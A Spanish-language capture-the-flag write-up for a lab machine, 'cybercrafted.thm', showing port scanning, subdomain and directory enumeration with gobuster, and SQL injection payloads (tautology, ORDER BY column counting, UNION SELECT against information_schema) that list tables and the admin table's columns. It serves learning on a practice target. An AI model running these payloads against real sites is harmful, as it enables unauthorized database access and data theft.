### Tags: `Virtual Hosting` `SQLI` `ssh2john`

# Escaneo (*22,80,25565*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn ip -oN escaneo
```
![image](https://github.com/user-attachments/assets/f0272aa8-5cfc-4150-a6fe-e7be9d396599)

# Web port80

Encontramos un dominio que lo añadimos sal  `etc/hosts`

![image](https://github.com/user-attachments/assets/9a964c02-b302-4e33-8090-8537bf3a52a8)

Ahora visualizamos la web y no había nada pero cuando hicimos `Ctrl + u` encontramos esto

![image](https://github.com/user-attachments/assets/c1ce8331-fd13-4d65-b70d-4a6d4ba51e1f)

## Gobuster (**subdominios**)

```ruby
gobuster vhost -u http://cybercrafted.thm/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Encontramos estos subdominios los agregamos al `etc/hosts`

![image](https://github.com/user-attachments/assets/be7fc1ce-5590-4615-a596-478575e2909a)

En los 2 (que marcamos en rojo) había un **panel de login** que era el mismo --> (por este lado no es la vía)

![image](https://github.com/user-attachments/assets/99e08865-a65c-40cc-b483-4a6acd18f59c)

También había un subdominio `www.store.cybercrafted.thm` y haciendo Gobuster encontramos este `search.php

![image](https://github.com/user-attachments/assets/dd9247cc-8988-49cd-a414-e181d107ef53)

```ruby
gobuster dir -u http://www.store.cybercrafted.thm/  -t 100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php --no-error
```

![image](https://github.com/user-attachments/assets/40e00520-edb0-48ef-939c-e7e093ec3d1d)
![image](https://github.com/user-attachments/assets/51dca3c3-8ae7-4158-b14a-b2a6bc9b600b)

# SQLI (**BurpSuite**)

 Observamos que es panel es a vulnerable `sql injection`, si poníamos `'or 1=1 -- -` nos muestra ítems que no aparecían antes. Interceptamos la petición con Burp y con `'order by 4-- -` supimos que había cuatro columnas.
 Con este comando `'union select NULL,NULL,NULL,table_name FROM information_schema.tables -- -` observamos una tabla llamada `admin`

![image](https://github.com/user-attachments/assets/36d09945-f699-4884-80ed-2b5ad6936794)

Con este comando `'union select NULL,NULL,NULL,column_name FROM information_schema.columns where table_name = 'admin' -- -`  enumeramos las tablas de `admin`.

![image](https://github.com/user-attachments/assets/a8fb8bf0-294b-428f-90a8-8cf8e2bfec6a)
